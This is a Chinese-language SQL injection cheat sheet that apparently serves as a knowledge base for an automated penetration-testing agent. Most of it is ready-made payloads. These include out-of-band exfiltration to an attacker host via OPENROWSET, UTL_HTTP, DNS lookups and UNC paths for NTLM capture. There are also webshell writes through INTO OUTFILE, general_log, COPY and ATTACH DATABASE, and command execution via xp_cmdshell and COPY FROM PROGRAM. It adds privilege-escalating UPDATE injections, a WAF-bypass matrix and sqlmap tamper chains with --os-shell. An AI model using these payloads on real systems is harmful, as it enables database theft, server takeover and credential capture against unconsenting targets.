# SQL 注入进阶专题

> OOB 带外、各库 OS 命令执行、WAF 绕过矩阵、非主流 DB、二阶注入、GraphQL、SQLMap 高级。
> 基础（识别/UNION/盲注速查）见 `$AGENT_DIR/knowledge-base/web-vulnerabilities.md` §1.2。

---

## 1. 检测与 DBMS 路由

**行为差异信号**：`'` vs `''` 页面不同｜数值型 `1`/`1-1`/`2-1` 返回相同（算术被求值）｜`1=1` vs `1=2` 结果变化｜`'` 500 而 `''` 200｜响应大小差异。全参数类型测试：URL/POST/JSON 字段/XML/HTTP 头（X-Forwarded-For/UA/Referer/Cookie）。

**错误指纹路由**：`You have an error in your SQL syntax`→MySQL（试 SLEEP/@@version）；`Microsoft OLE DB Provider`→MSSQL（WAITFOR DELAY）；`PG::`→PostgreSQL（pg_sleep）；`ORA-`→Oracle（OOB 通道）。

**UNION 提取**：`ORDER BY N` 递增定列数 → `UNION SELECT NULL,NULL,...` → 逐列换 `'a'` 找字符串列。整型列显示字符串：MySQL `CONCAT(a,0x3a,b)`、MSSQL `a+'|'+b`、Oracle/PG `a||'|'||b`。

**元数据**：MySQL `information_schema.*`（table_schema=database()）；MSSQL `master..sysdatabases`/`sysobjects xtype='U'`/`syscolumns WHERE id=OBJECT_ID()`；Oracle `all_tables`/`all_tab_columns`/`dba_users`（DBA）；PG `pg_database`/`pg_tables`。

## 2. OOB 带外外带

| DB | 通道 | Payload 要点 |
|----|------|-------------|
| MSSQL | OpenRowSet 回连 | `INSERT INTO OPENROWSET('SQLOLEDB','...SERVER=attacker.com,80...','SELECT * FROM foo') VALUES(@@version)--`，用 80/443 绕出口防火墙 |
| Oracle | UTL_HTTP | 支持代理可穿企业代理：`UTL_HTTP.REQUEST('http://attacker/'\|\|(SELECT user FROM dual))` |
| Oracle | UTL_INADDR DNS | `GET_HOST_NAME((SELECT password FROM dba_users WHERE username='SYS')\|\|'.attacker.com')` |
| Oracle | XMLTYPE XXE | `<!ENTITY xxe SYSTEM "http://ATTACKER/'\|\|数据">` 外带 |
| MySQL(Win) | LOAD_FILE UNC | `LOAD_FILE('\\\\attacker.com\\share')` 触发 DNS；`\\\\attacker-ip\\`+user() SMB 认证回连 → Responder 收 NTLMv2 |
| MySQL | INTO OUTFILE | `SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/shell.php'`（需 FILE 权限+secure_file_priv=''） |

## 3. OS 命令执行升级

**MSSQL**：xp_cmdshell（被禁时 sysadmin 经 sp_configure 开启）｜sp_OACreate 'wscript.shell' + sp_OAMethod run｜CLR 程序集（CREATE ASSEMBLY ... PERMISSION_SET=UNSAFE）｜Agent Job（sp_add_job + CmdExec 子系统）｜链接服务器横向（sysservers 枚举 → `EXEC('xp_cmdshell ''whoami''') AT [LINKED_SRV]`，可双跳）｜xp_dirtree '\\attacker\share' 捕 NTLM｜**BULK INSERT 读文件**（`CREATE TABLE #tmp(c VARCHAR(8000)); BULK INSERT #tmp FROM 'C:\Windows\win.ini'`，无 xp_cmdshell 时）｜**差异备份写 Webshell**（`BACKUP DATABASE db TO DISK='...' WITH DIFFERENTIAL, FORMAT`，配合先插含 shell 内容的表）。

**MySQL**：UDF（写库存 CREATE FUNCTION SONAME）｜HANDLER 读表绕 SELECT｜`SET @q=0x...; PREPARE; EXECUTE` hex 绕关键字｜sys.schema_table_statistics 替代 information_schema（5.7+）｜INTO DUMPFILE 二进制写｜**日志写 webshell**（outfile 被禁/secure_file_priv 限制时）: `SET GLOBAL general_log=ON; SET GLOBAL general_log_file='/var/www/html/shell.php';` 后执行含 `<?php ...?>` 的任意 SQL（内容进日志即落盘）| **INTO OUTFILE 全选项写马**（outfile 可用时）: `LINES STARTING BY '<?php eval(...);?>'` 每行以前缀落盘（注入点在文件名参数: `filename=ma.php' LINES STARTING BY '马'#`）｜`FIELDS TERMINATED BY` 分隔符插中段｜**过滤 .php 后缀**时写 `.user.ini`: `filename=.user.ini' lines starting by ';' terminated by 0x0a617574...0a;#`（hex="\nauto_prepend_file=1.jpg\n" 首尾换行保证指令独占行; 引号被禁时子句参数全用 hex）| **MySQL 8.0 注入面**: ①`TABLE t LIMIT n` 替代 SELECT *（不可加 WHERE 但可 UNION SELECT）; ②`VALUES ROW(1),ROW(2)` 构造记录集（配反引号取列/UNION）; ③information_schema 也被禁时用 `information_schema.TABLESPACES_EXTENSIONS`/`TABLES_EXTENSIONS`（8.0.21+）爆库表名｜**SLEEP 被过滤的替代延时族**（条件真时执行的替换项）: ①`BENCHMARK(10000000,MD5('test'))` 大量重复计算; ②笛卡尔积重查询 `(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)`（行数相乘 4927³ 级）; ③正则回溯 `RPAD('a',1000000,'a') RLIKE CONCAT(REPEAT('(a.*)+',30),'b')`——嵌套量词回溯组合数 ≈ len^层数 天文数字; ④`GET_LOCK('x',5)` 双会话占锁（要求连接池/持久连接且两 HTTP 请求共用同一 DB 连接，每请求新建连接的环境不可用）; if() 被 ban 时用 `CASE WHEN cond THEN <延时项> ELSE 0 END`｜**where 被禁时 RIGHT JOIN ON 盲注**: `t as a right join t as b on b.pass like 0x6374...25`——ON 承担过滤、join 行数差当布尔 oracle（配合 count 回显）; HAVING 同族替代; 引号禁→like 模式转 hex｜**数字+引号全禁时 true 构造**: `true+true`=2 任意整数（`('true+'*n)[:-1]`）、字符串 `concat(chr(true+...),...)` 彻底脱离字面量

**Oracle**：dbms_java.grant_permission + Java Runtime｜DBMS_SCHEDULER CREATE_JOB(job_type=>'EXECUTABLE')｜DBMS_JAVA.RUNJAVA｜**UTL_FILE 读文件**（CREATE DIRECTORY + FOPEN/GET_LINE，无 Java 权限时的文件读）｜时间盲 DBMS_PIPE.RECEIVE_MESSAGE('a',5) → DBMS_LOCK.SLEEP → 重查询 all_objects 自乘。

**PostgreSQL**：`COPY (SELECT $$<?php system($_GET['c']); ?>$$) TO '/var/www/html/shell.php'` 写 shell｜COPY tmp FROM 读文件｜**COPY FROM PROGRAM 命令执行**（superuser: `CREATE TABLE cmd_exec(o text); COPY cmd_exec FROM PROGRAM 'id'`）｜COPY TO 导出数据落盘｜lo_import/lo_get 大对象｜PL/pgSQL + sys_exec｜**美元引号** `$$...$$`/`$tag$...$tag$` 绕引号过滤。

**SQLite**：`ATTACH DATABASE '/var/www/html/shell.php' AS pwn; CREATE TABLE pwn.cmd(...); INSERT ...` 写 webshell/crontab｜load_extension(.so/.dll，需编译开关)｜时间盲 `LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))`｜错误盲注 `CASE WHEN cond THEN 1 ELSE load_extension(1) END`。

## 4. INSERT/UPDATE/DELETE + 二阶 + 参数化失效

**INSERT**：闭合后补全语法外带——`admin', 'login'), ('attacker', (SELECT password FROM users LIMIT 1))--`（插进行里含密码）；Oracle 子查询补 FROM dual。

**UPDATE**：`attacker@evil.com', is_admin='1`（提权）｜`anything' WHERE 1=1;--`（扩全表）｜`'||(SELECT password FROM users WHERE username='admin')||'`（哈希写进可读字段）。

**DELETE**：`' OR '1'='1` 删全表（危险）；时间盲 `OR IF(...,SLEEP(5),0) OR '`。

同一端点全动词都测：GET→SELECT、POST→INSERT、PUT→UPDATE、DELETE→DELETE。

**二阶注入**：注册 `admin'--` → 安全入库 → 改密码功能拼接 `UPDATE ... WHERE username='admin'--'` → 改掉 admin 密码。SQLMap `--second-url` / `--second-req`。

**参数化失效四场景**：①表/列名拼接（标识符不能参数化，白名单校验）②部分参数化 ③IN 子句动态个数 ④二阶。`PDO::ATTR_EMULATE_PREPARES=true` 模拟预处理支持堆叠。

## 5. WAF/过滤器绕过矩阵

| 被过滤 | 绕过 |
|---|---|
| 空格 | `/**/`、%09/%0a/%0b、括号 `UNION(SELECT(1),(2))` |
| 逗号 | JOIN 型 UNION `(SELECT 1)a JOIN (SELECT 2)b`、`SUBSTRING(x FROM 1 FOR 1)`、`LIMIT 1 OFFSET 0` |
| 引号 | hex `0x61646D696E`、`CHAR(...)`、PG `$$..$$` |
| OR/AND | `\|\|1=1`、`&&1=1`、`DIV 0` |
| = | `LIKE`/`REGEXP`/`IN`/`BETWEEN` |
| SELECT | MySQL `HANDLER t OPEN; HANDLER a READ NEXT`、`PREPARE FROM 0x...` |
| information_schema | `mysql.innodb_table_stats`、`sys.schema_table_statistics` |
| 关键字删一次 | 双写 `uunionnion sselectelect` |
| group_concat | `GROUP BY` + `FLOOR(RAND()*2)` 报错注入 |
| 仅剩 ^ | XOR 盲注 `1^(ascii(substr(...))>100)^1` |
| \|\| 未滤 | `SET sql_mode=PIPES_AS_CONCAT` 后 \|\| 变拼接 |

**MySQL 版本注释**（实战大量验证）：`/*!50000union*//*!50000select*/1,2,3`——MySQL≥5 才执行注释内语句，WAF 常不识别。

**宽字节**（GBK + addslashes/GPC）：`%bf%27`（0xbf+0x27 组成合法 GBK 双字节吃掉转义）；变体 `%aa%27`、`%81%5c%27`。

**无列名注入**：`SELECT \`3\` FROM (SELECT 1,2,3 UNION SELECT * FROM target)a` 反引号数字按位取列。**改表嫁接**：`ALTER TABLE flag RENAME TO words` + 补 id 列，让应用自带查询返回数据。**JOIN 报错爆列名**: `SELECT * FROM (SELECT * FROM users a JOIN users b)c` 重复列报错 `Duplicate column name 'id'`——NOT IN 逐个排除继续爆下一列; 取别名绕列名 `SELECT a.``2`` FROM (SELECT 1,2,3 UNION SELECT * FROM t)a`。

**编码**：双重 URL `%2527`｜部分编码 `%53ELECT`｜Unicode 规范化 `ʼ`(U+02BC)/`＇`(U+FF07)｜AWS WAF 用 JSON body + chunked 分块。**polyglot**：`SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/`。

## 6. 非主流 DB

**DB2**：版本 `sysibm.sysversions`；DUAL 等价 `sysibm.sysdummy1`；取行 `FETCH FIRST 1 ROWS ONLY`；时间盲三表笛卡尔积；RCE 仅 IBM i `CALL QSYS2.QCMDEXC('cmd')`；无引号 `chr(65)||chr(68)...`。

**Cassandra CQL**：无 JOIN/UNION/子查询/OR/SLEEP，仅 `/* */` 注释。认证绕过：`admin' ALLOW FILTERING; %00` 空字节截断；跨字段注释拼接 用户名 `admin'/*` + 密码 `*/and pass>'`。

**BigQuery**：反引号标识 + `@@project_id` 识别；错误型除零 `if(1/(length((select('a')))-1)=1,...)`；**无 SLEEP 无堆叠**；注释 `#` 与 `/* */`。

**Access**（无 information_schema）：`MSysObjects` 探测；函数 MID/ASC/IIF/TOP；多行枚举 `WHERE id NOT IN (SELECT TOP N id ...)`；时间盲五表笛卡尔积；表名靠源码下载/命名推测（admin/C_User/C_Admin）/同厂商站点复用。

## 7. WooYun 实战经验

**高频参数名**：id/sort_id/stid/username/password/type/name/action/page；ASP.NET 特有 `__viewstate`/`__eventvalidation`/`__eventargument`/`__eventtarget`。

**高危 URL**：`detail.php?id=`、`view.aspx?pid=`、`search.php?keyword=`、`manage/user.php?action=edit&uid=`。文件类型：.php→MySQL；.aspx→MSSQL/Oracle；.asp→Access/MSSQL。

**注入点扩展**：JSON 键名（键作列名）、URI 路径段、HTTP 头、Cookie、multipart 文件名、API sort 参数。

**认证后注入**（扫描器盲区）：注册会员 → 遍历业务 URL → 提 ID 类参数 → 数字型 `AND 1=1/1=2` → 伪静态转换 `/path/bid/1.html` → `?bid=1`（去后缀变 GET，可能绕 WAF）→ 时间盲 `SLEEP(6)`。

**ThinkPHP 特征**：`where('bid='.$this->_get('bid'))` 拼接（M() 无验证）；报错注入 `updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)`。

**主站+子站模式**（政府/教育/集团）：子站漏洞占比高、老系统多、DB 权限过高、常无 WAF。子站枚举：`site:domain -www`、crt.sh、sublist3r。

## 8. GraphQL + SQLi

batched query（单请求多查询打不同 resolver）｜嵌套字段（where/orderBy 参数拼接）｜mutation 对应 INSERT/UPDATE/DELETE 全字段测｜introspection 枚举 `id/filter/where/search/orderBy/sort/limit/offset` 参数名——常映射 SQL 子句。SQLMap：`--data='{"query":"{ user(id: \"1*\") { name } }"}' --content-type="application/json"`，复杂用 `-r req.txt -p id`。

## 9. SQLMap 高级

**tamper 矩阵**（逗号串联）：space2comment（空格→注释）、space2hash（MySQL #\n）、between（比较符）、chardoubleencode（双层代理）、randomcase、randomcomments、equaltolike、greatest、modsecurityversioned（`/*!50000*/`）、percentage（IIS/ASP）、appendnullbyte、symboliclogical、bluecoat、sp_password（MSSQL 日志隐藏）。

**链式配方**：MySQL+ModSecurity=`space2comment,between,randomcase,modsecurityversioned`；MySQL+Cloudflare=`space2comment,charencode,randomcase,between`；MSSQL+IIS=`space2mssqlblank,randomcase,charencode,sp_password`。

**flags**：`--technique=BEUST`（B布尔/E报错/U UNION/S堆叠/T时间/Q内联）；`--level` 2加Cookie 3加UA/Referer 5全量；`--risk` 3 加 OR 型（UPDATE/DELETE 场景必需，注意会改数据）；`--data="id=1*"` 星号标注入点；`--second-url` 二阶；`--os-shell`/`--os-pwn`/`--file-write`；`--identify-waf`、`--prefix/--suffix` 自定义闭合、`--charset` 加速盲注。


## 增补: 注入源与方言技巧

- **WITH ROLLUP 绕应用层密码比较**: 注入点在 username、应用比较 `$row['password']==$_POST['password']` 且过滤逗号时——`uname' GROUP BY password WITH ROLLUP LIMIT 1 OFFSET 1#` 使结果集多出一行 password=NULL 的统计行，空密码 `""==NULL` 松散相等通过（OFFSET 替代逗号; 前提 mysql_num_rows==1 类校验）
- **反斜杠转义引号**: 输入 `\` 吃掉应用拼接的引号——`WHERE name='\' OR 1=1-- '`（拼接结构错位; 引号过滤之外的转义利用）
- **LIKE 逐位爆破**: `LIKE 'a%'`→`'ab%'` 逐字符（与 NoSQL $regex 同构的盲注原语）
- **processlist 泄露**: information_schema.processlist 含各连接正在执行的 SQL（他管理员的查询里可能带凭据/答案）; SECUINSIDE 变体: 高频轮询 processlist 抓瞬时敏感查询（竞态泄露）
- **session 变量双值注入**: `@a:=(select ...)` 赋值后在同连接后续引用——预编译/多语句受限时的值传递通道
- **PROCEDURE ANALYSE()**: 无 information_schema 权限时列枚举替代（innodb_table_stats 之外的备选）
- **非常规注入通道**: EXIF 元数据（图片入库时反射）/ QR 码内容 / Shift-JIS 宽字节（GBK 家族变体）/ X-Forwarded-For（SQLite 场景配合 PHPSESSID 差异做 UNION oracle）
- **MySQL 语义陷阱**: 非严格模式列截断注册同名 admin; INSERT 注入 ON DUPLICATE KEY UPDATE 覆盖已有密码
- **PCRE backtrack WAF 绕过**: 超长输入使 WAF 的 preg_match 超 pcre.backtrack_limit 返 false→放行（同原语的 WAF 应用面）
- **DNS 记录做注入源**: gethostbyaddr/dns_get_record 结果拼 SQL——自己 IP 的 PTR 指自有域+TXT 记录放 payload `' UNION SELECT flag FROM flags-- `（与 DNS 外带通道相反: DNS 是源）
- **HQL U+00A0 走私**: HQL 解析器把不间断空格当普通字符、H2 当空白——子查询关键字间插 \u00a0 绕 HQL 校验（error-based cast 提取）
- **INSERT 双字段列移位**: 长度受限字段开 `concat(`、无限字段闭 `,(select ...)))#`——提取移到无限制字段
- **ORDER BY CASE**: WHERE 不可用时 `ORDER BY (CASE WHEN msg LIKE '%flag%' THEN 1 ELSE 0 END) DESC` 控序把目标行顶到最前

### §9a sqlmap 进阶策略与 tamper

执行纪律: --batch 必加 + **timeout 480 包裹**（超时 tail 日志看已有结果）+ --flush-session 清缓存。**检测优先级: --technique EU 快测 → 加 B → 最后才 T（时间盲极慢）**。注入点: -r Burp 文件最可靠 / --headers 'XFF: 1*' 星号标记（Header --level 5/Cookie 3）/ --data 含 submit 按钮（isset 校验）/ 检测不到但手工已确认 → --prefix/--suffix 指定闭合。**--search -T flag 全库搜表**（CTF 最快）; --second-url 二次注入; --os-shell/--file-write。tamper: MySQL 通用 space2comment,between,randomcase / 强 WAF +equaltolike,greatest,halfversionedmorekeywords --delay 1 / MSSQL +charencode。--risk 3 会 UPDATE/DELETE。hydra 密码喷洒与 -e nsr 见 internal-pentest-methodology.md §7a。
